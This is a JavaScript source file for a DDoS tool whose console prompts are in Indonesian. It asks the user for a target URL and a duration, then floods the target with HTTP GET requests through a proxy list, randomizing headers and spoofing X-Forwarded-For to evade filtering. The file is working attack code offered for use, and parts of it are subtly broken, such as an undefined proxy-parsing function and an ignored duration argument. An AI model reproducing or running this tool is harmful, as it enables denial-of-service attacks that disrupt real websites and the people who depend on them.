const fs = require('fs');
const axios = require('axios');
const SocksProxyAgent = require('socks-proxy-agent');
const HttpsProxyAgent = require('https-proxy-agent');
const randomUseragent = require('random-useragent');
const chalk = require('chalk');
const inquirer = require('inquirer');
const cfonts = require('cfonts');
const boxen = require('boxen');
const ora = require('ora');
const cliProgress = require('cli-progress');

function ddosin(targetUrl) {
  function langHeader() {
    const languages = [
      'af',
      'am',
      'ar',
      'as',
      'az',
      'be',
      'bg',
      'bn',
      'bs',
      'ca',
      'cs',
      'cy',
      'da',
      'de',
      'dv',
      'dz',
      'el',
      'en',
      'eo',
      'es',
      'et',
      'eu',
      'fa',
      'fi',
      'fo',
      'fr',
      'ga',
      'gl',
      'gn',
      'gu',
      'he',
      'hi',
      'hr',
      'hu',
      'hy',
      'id',
      'is',
      'it',
      'ja',
      'jv',
      'ka',
      'kk',
      'km',
      'kn',
      'ko',
      'ku',
      'ky',
      'la',
      'lb',
      'lo',
      'lt',
      'lv',
      'mg',
      'mi',
      'mk',
      'ml',
      'mn',
      'mr',
      'ms',
      'mt',
      'my',
      'ne',
      'nl',
      'no',
      'or',
      'pa',
      'pl',
      'ps',
      'pt',
      'ro',
      'ru',
      'rw',
      'sa',
      'sd',
      'si',
      'sk',
      'sl',
      'sm',
      'sn',
      'so',
      'sq',
      'sr',
      'sv',
      'sw',
      'ta',
      'te',
      'tg',
      'th',
      'ti',
      'tk',
      'tl',
      'tn',
      'tr',
      'ts',
      'tt',
      'ug',
      'uk',
      'ur',
      'uz',
      'vi',
      'xh',
      'zh-CN',
      'zh-TW',
      'zu',
      'en-AU',
      'en-CA',
      'en-GB',
      'en-IN',
      'en-IE',
      'en-NZ',
      'en-ZA',
      'en-US',
      'fr-BE',
      'fr-CA',
      'fr-CH',
      'fr-FR',
      'es-ES',
      'es-MX',
      'pt-BR',
      'pt-PT',
      'zh-HK',
      'zh-MO',
      'zh-SG',
      'zh-TW',
    ];

    function getRandomInt(min, max) {
      return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    function getRandomQuality() {
      return (Math.random() * (1 - 0.5) + 0.5).toFixed(1);
    }

    const numLangs = getRandomInt(1, 5);
    const headerParts = [];
    for (let i = 0; i < numLangs; i++) {
      const lang = languages[getRandomInt(0, languages.length - 1)];
      if (i === 0) {
        headerParts.push(lang);
      } else {
        headerParts.push(`${lang};q=${getRandomQuality()}`);
      }
    }

    return headerParts.join(', ');
  }

  function AcceptEncodingHeader() {
    const encodings = ['gzip', 'deflate', 'br', 'compress', 'identity'];

    function getRandomInt(min, max) {
      return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    const numEncodings = getRandomInt(1, encodings.length);
    const acceptEncodingParts = [];
    for (let i = 0; i < numEncodings; i++) {
      const encoding = encodings[getRandomInt(0, encodings.length - 1)];
      acceptEncodingParts.push(
        `${encoding};q=${(Math.random() * (1 - 0.5) + 0.5).toFixed(1)}`
      );
    }

    return acceptEncodingParts.join(', ');
  }

  const refers = () => {
    const getRandomInt = max => Math.floor(Math.random() * max);
    const generateRandomName = () => {
      const chars = 'abcdefghijklmnopqrstuvwxyz';
      let name = '';
      for (let i = 0; i < 8; i++) {
        name += chars[getRandomInt(chars.length)];
      }
      return name;
    };
    const protocols = ['http://', 'https://'];
    const subdomains = [
      'www.',
      'search.',
      'play.',
      'drive.',
      'jobs.',
      'add.',
      'profile.',
      'careers.',
      'taginfo.',
      'engadget.',
      'developers.',
      'api.',
      'my.',
      'dashboard.',
      '',
      'mail.',
      'news.',
      'shop.',
      'store.',
      'blog.',
      'support.',
    ];
    const domainNames = [
      'google',
      'yahoo',
      'bing',
      'facebook',
      'baidu',
      'yandex',
      'usatoday',
      'duckduckgo',
      'ask',
      'vk',
      'reddit',
      'npmjs',
      'pinterest',
      generateRandomName(),
      'amazon',
      'youtube',
      'linkedin',
      'twitter',
      'instagram',
      'netflix',
      'tiktok',
      'microsoft',
      'apple',
      'adobe',
      'github',
    ];
    const tlds = [
      'com',
      'xyz',
      'net',
      'biz',
      'info',
      'org',
      'edu',
      'pro',
      'travel',
      'coop',
      'tv',
      'tor',
      'io',
      'asia',
      'co',
      'us',
      'me',
      'tech',
      'site',
      'online',
    ];
    const getRandomElement = arr => arr[getRandomInt(arr.length)];
    return `${getRandomElement(protocols)}${getRandomElement(subdomains)}${getRandomElement(domainNames)}.${getRandomElement(tlds)}`;
  };

  function cplist() {
    const cipherSuites = [
      'ECDHE-RSA-AES128-GCM-SHA256',
      'ECDHE-ECDSA-AES128-GCM-SHA256',
      'ECDHE-RSA-AES256-GCM-SHA384',
      'ECDHE-ECDSA-AES256-GCM-SHA384',
      'DHE-RSA-AES128-GCM-SHA256',
      'kEDH+AESGCM',
      'ECDHE-RSA-AES128-SHA256',
      'ECDHE-ECDSA-AES128-SHA256',
      'ECDHE-RSA-AES128-SHA',
      'ECDHE-ECDSA-AES128-SHA',
      'ECDHE-RSA-AES256-SHA384',
      'ECDHE-ECDSA-AES256-SHA384',
      'ECDHE-RSA-AES256-SHA',
      'ECDHE-ECDSA-AES256-SHA',
      'DHE-RSA-AES128-SHA256',
      'DHE-RSA-AES128-SHA',
      'DHE-RSA-AES256-SHA256',
      'DHE-RSA-AES256-SHA',
      '!aNULL',
      '!eNULL',
      '!EXPORT',
      '!DSS',
      '!DES',
      '!RC4',
      '!3DES',
      '!MD5',
      '!PSK',
    ];

    for (let i = cipherSuites.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [cipherSuites[i], cipherSuites[j]] = [cipherSuites[j], cipherSuites[i]];
    }

    return cipherSuites.join(':');
  }

  function AcceptHeader() {
    const mediaTypes = [
      { type: 'text', subtypes: ['html', 'plain', 'css', 'javascript'] },
      { type: 'application', subtypes: ['json', 'xml', 'pdf', 'zip'] },
      { type: 'image', subtypes: ['jpeg', 'png', 'gif'] },
      { type: 'video', subtypes: ['mp4', 'webm', 'avi'] },
      { type: 'audio', subtypes: ['mp3', 'wav', 'ogg'] },
    ];

    function getRandomInt(min, max) {
      return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    function getRandomQuality() {
      return (Math.random() * (1 - 0.5) + 0.5).toFixed(1);
    }

    const numMediaTypes = getRandomInt(1, mediaTypes.length);
    const acceptParts = [];
    for (let i = 0; i < numMediaTypes; i++) {
      const mediaType = mediaTypes[i];
      const subtype =
        mediaType.subtypes[getRandomInt(0, mediaType.subtypes.length - 1)];
      acceptParts.push(`${mediaType.type}/${subtype};q=${getRandomQuality()}`);
    }
    acceptParts.push('*/*;q=0.1');

    return acceptParts.join(', ');
  }

  const mediaTypes = [
    'application/json',
    'application/xml',
    'text/html',
    'text/plain',
    'multipart/form-data',
    'application/pdf',
    'image/jpeg',
    'image/png',
    'audio/mpeg',
    'video/mp4',
    'application/javascript',
    'application/octet-stream',
    'application/xhtml+xml',
    'application/rss+xml',
    'application/zip',
    'application/x-www-form-urlencoded',
  ];

  function readProxyList() {
    try {
      const data = fs.readFileSync(proxyListFile, 'utf8');
      return data
        .trim()
        .split('\n')
        .map(line => line.trim());
    } catch (error) {
      console.error(`Failed to read proxy list: ${error}`);
      return [];
    }
  }
  function generateRandomIP() {
    const ipParts = [];
    for (let i = 0; i < 4; i++) {
      ipParts.push(Math.floor(Math.random() * 256));
    }
    return ipParts.join('.');
  }

  function getRandomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
  }

  const proxyListFile = 'proxy.txt';

  function sendRequest(target, agent) {
    const headers = {
      'User-Agent': randomUseragent.getRandom(),
      Accept: AcceptHeader(),
      'Accept-Encoding': AcceptEncodingHeader(),
      'Accept-Language': langHeader(),
      Referer: refers(),
      'Cache-Control': cplist(),
      DNT: '1',
      Connection: 'keep-alive',
      'Upgrade-Insecure-Requests': '1',
      TE: 'Trailers',
      'If-Modified-Since': new Date().toUTCString(),
      'X-Requested-With': 'XMLHttpRequest',
      'X-Forwarded-For': generateRandomIP(),
      'Content-Type': getRandomElement(mediaTypes),
    };

     axios
      .get(target, { httpAgent: agent, headers: headers })
      .then(response => {})
      .catch(error => {
        sendRequest(target, agent);
      });
  }

  function sendRequests() {
    const proxyList = readProxyList();
    let currentIndex = 0;

    function sendRequestUsingNextProxy() {
      if (currentIndex < proxyList.length) {
        const proxyUrl = proxyList[currentIndex];
        let agent;
        if (proxyUrl.startsWith('socks4') || proxyUrl.startsWith('socks5')) {
          agent = new SocksProxyAgent(proxyUrl);
        } else if (proxyUrl.startsWith('https')) {
          agent = new HttpsProxyAgent({
            protocol: 'http',
            ...parseProxyUrl(proxyUrl),
          });
        }
        sendRequest(targetUrl, agent);
        currentIndex++;
        setImmediate(sendRequestUsingNextProxy);
      } else {
        sendRequests;
      }
    }
    sendRequestUsingNextProxy();
  }

  sendRequests();
}

async function main() {
  console.clear();
  cfonts.say('DDOS ATTACK', {
    font: 'chrome',
    align: 'center',
    colors: ['red', 'green'],
    background: 'black',
    letterSpacing: 1,
    lineHeight: 1,
    space: true,
    maxLength: '0',
  });
  console.log(
    chalk.green.bold('Apakah Anda yakin ingin meluncurkan serangan DDoS?')
  );
  const { confirmDDoS } = await inquirer.prompt({
    type: 'confirm',
    name: 'confirmDDoS',
    message: chalk.green('Konfirmasi (y/n):'),
  });

  if (!confirmDDoS) {
    console.log(chalk.red.bold('Proses DDoS dibatalkan.'));
    return;
  }

  const { url } = await inquirer.prompt({
    type: 'input',
    name: 'url',
    message: chalk.green('Masukkan URL target untuk serangan DDoS:'),
    validate: input => (input ? true : 'URL tidak boleh kosong'),
  });

  const { duration } = await inquirer.prompt({
    type: 'input',
    name: 'duration',
    message: chalk.green('Masukkan durasi serangan DDoS (dalam detik):'),
    validate: input => {
      const parsed = parseInt(input);
      return isNaN(parsed) || parsed <= 0
        ? 'Masukkan durasi yang valid (angka positif)'
        : true;
    },
  });

  const dataBox = boxen(
    `URL Target: ${chalk.green(url)}\nDurasi Serangan: ${chalk.green(duration)} detik`,
    { padding: 1, margin: 1, borderStyle: 'double', borderColor: 'green' }
  );

  console.log(chalk.green.bold('Data yang Anda masukkan:'));
  console.log(dataBox);

  const { confirmData } = await inquirer.prompt({
    type: 'confirm',
    name: 'confirmData',
    message: chalk.green('Apakah data yang Anda masukkan sudah benar? (y/n):'),
  });

  if (!confirmData) {
    console.log(chalk.red.bold('Mengulang proses dari awal...'));
    return main();
  }

  const preparingSpinner = ora(
    chalk.green('Menyiapkan serangan DDoS...')
  ).start();

  setTimeout(() => {
    preparingSpinner.succeed(chalk.green('✓ Serangan DDoS disiapkan.'));

    const progressBar = new cliProgress.SingleBar({
      format:
        chalk.green('{bar}') +
        ' ' +
        chalk.red('{percentage}%') +
        ' | ' +
        chalk.yellow('{value}/{total} Detik'),
      barCompleteChar: '\u2588',
      barIncompleteChar: '\u2591',
      hideCursor: true,
    });

    progressBar.start(parseInt(duration), 0);

    let value = 0;
    const interval = setInterval(() => {
      value++;
      progressBar.update(value);

      if (value >= parseInt(duration)) {
        clearInterval(interval);
        progressBar.stop();
        console.log(
          chalk.red.bold('Serangan DDoS telah diluncurkan ke ' + url)
        );

        setTimeout(() => {
          console.log(
            chalk.green.bold('Proses selesai. Keluar dari aplikasi.')
          );
          process.exit(0);
        }, 1000);
      }
    }, 1000);

    ddosin(url, duration);
  }, 2000);
}

main();
